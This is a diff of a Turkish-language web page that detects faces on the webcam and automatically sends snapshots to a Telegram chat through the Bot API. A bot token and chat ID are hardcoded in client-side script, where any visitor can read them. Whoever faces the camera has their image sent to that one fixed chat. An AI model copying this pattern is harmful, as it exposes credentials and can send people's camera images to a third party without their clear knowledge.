@@ -3,22 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yüz Algılama ve Telegram Gönderimi</title>
+    <title>Yüz Takip ve Telegram Gönderim</title>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_detection"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; background: #1a1a1a; color: white; padding: 20px; }
-        #info-box { background: #333; padding: 15px; border-radius: 8px; margin-bottom: 20px; max-width: 600px; text-align: center; border-left: 5px solid #00bbff; }
+        body { font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; background: #121212; color: #ffffff; margin: 0; padding: 20px; }
+        #info-box { background: #1e1e1e; padding: 20px; border-radius: 12px; margin-bottom: 20px; max-width: 600px; text-align: center; border: 1px solid #0088cc; box-shadow: 0 4px 15px rgba(0,136,204,0.3); }
         .container { position: relative; width: 640px; height: 480px; }
-        video, canvas { position: absolute; left: 0; top: 0; border-radius: 10px; }
-        #startBtn { padding: 12px 25px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 5px; margin-top: 10px; }
+        video, canvas { position: absolute; left: 0; top: 0; border-radius: 15px; width: 640px; height: 480px; }
+        #startBtn { padding: 15px 35px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 50px; margin-top: 20px; transition: 0.3s; font-weight: bold; }
+        #startBtn:hover { background: #00aaff; transform: scale(1.05); }
     </style>
 </head>
 <body>
 
     <div id="info-box">
-        <h3>Sistem Açıklaması</h3>
-        <p>Bu sistem yüzünüzü algıladığında otomatik olarak ekran görüntüsü alır ve belirlediğiniz <b>Telegram</b> adresine gönderir. Lütfen bot ayarlarınızı kodun içindeki ilgili alana giriniz.</p>
+        <h3>Sistem Çalışma Mantığı</h3>
+        <p>Bu uygulama kameranızı kullanarak yüzünüzü tespit eder. Yüz algılandığında, otomatik olarak anlık bir görüntü alır ve <b>Telegram Botunuz</b> üzerinden size iletir.</p>
+        <small style="color: #888;">Not: İlk kullanımda kamera ve bildirim izni vermeniz gerekmektedir.</small>
     </div>
 
     <div class="container">
@@ -26,10 +28,10 @@
         <canvas id="output_canvas"></canvas>
     </div>
 
-    <button id="startBtn">Sistemi Başlat ve İzin Ver</button>
+    <button id="startBtn">Sistemi Başlat</button>
 
     <script>
-        // --- TELEGRAM AYARLARI ---
+        // Senin sağladığın Telegram Bilgileri
         const TELEGRAM_BOT_TOKEN = '8567641306:AAHz1V98pDTddIXVnBlf42Sjs4bI1_cAO64';
         const TELEGRAM_CHAT_ID = '792398679';
         
@@ -38,23 +40,26 @@
         const canvasCtx = canvasElement.getContext('2d');
         const startBtn = document.getElementById('startBtn');
         
-        let lastSentTime = 0; // Sürekli fotoğraf gitmemesi için zaman kontrolü
+        let lastSentTime = 0; 
 
         const faceDetection = new FaceDetection({
             locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`
         });
 
-        faceDetection.setOptions({ model: 'short-range', minDetectionConfidence: 0.6 });
+        faceDetection.setOptions({ model: 'short-range', minDetectionConfidence: 0.5 });
 
         faceDetection.onResults(async (results) => {
             canvasCtx.save();
+            canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
             canvasCtx.drawImage(results.image, 0, 0, canvasElement.width, canvasElement.height);
             
             if (results.detections.length > 0) {
-                // Yüzün etrafına çerçeve çiz
-                const box = results.detections[0].boundingBox;
-                canvasCtx.strokeStyle = '#00bbff';
-                canvasCtx.lineWidth = 4;
+                const detection = results.detections[0];
+                const box = detection.boundingBox;
+                
+                // Mavi çerçeve çizimi
+                canvasCtx.strokeStyle = '#0088cc';
+                canvasCtx.lineWidth = 5;
                 canvasCtx.strokeRect(
                     box.xCenter * canvasElement.width - (box.width * canvasElement.width / 2),
                     box.yCenter * canvasElement.height - (box.height * canvasElement.height / 2),
@@ -62,7 +67,7 @@
                     box.height * canvasElement.height
                 );
 
-                // Telegram'a gönder (Her 10 saniyede en fazla 1 kare gönderir)
+                // Yüz algılandı, Telegram'a gönder (10 saniye bekleme süreli)
                 const now = Date.now();
                 if (now - lastSentTime > 10000) { 
                     lastSentTime = now;
@@ -73,27 +78,24 @@
         });
 
         async function sendToTelegram() {
-            // Canvas içeriğini resme çevir
             canvasElement.toBlob(async (blob) => {
+                if (!blob) return;
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'face_detected.jpg');
-                formData.append('caption', 'Yüz algılandı! Otomatik çekim gönderiliyor.');
+                formData.append('photo', blob, 'face.jpg');
+                formData.append('caption', '📷 Yüz Algılandı! Otomatik kayıt gönderiliyor.');
 
                 try {
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    console.log("Görüntü Telegram'a gönderildi.");
-                } catch (e) {
-                    console.error("Telegram gönderim hatası:", e);
-                }
-            }, 'image/jpeg');
+                } catch (e) { console.error("Gönderim hatası:", e); }
+            }, 'image/jpeg', 0.7);
         }
 
         async function startSystem() {
-            await Notification.requestPermission();
+            const permission = await Notification.requestPermission();
             const camera = new Camera(videoElement, {
                 onFrame: async () => { await faceDetection.send({image: videoElement}); },
                 width: 640, height: 480
@@ -101,12 +103,12 @@
             canvasElement.width = 640;
             canvasElement.height = 480;
             camera.start();
-            startBtn.style.display = 'none';
+            startBtn.innerText = "Sistem Aktif...";
+            startBtn.disabled = true;
+            startBtn.style.opacity = "0.5";
         }
 
         startBtn.addEventListener('click', startSystem);
     </script>
-</body>
-</html>
 </body>
 </html>
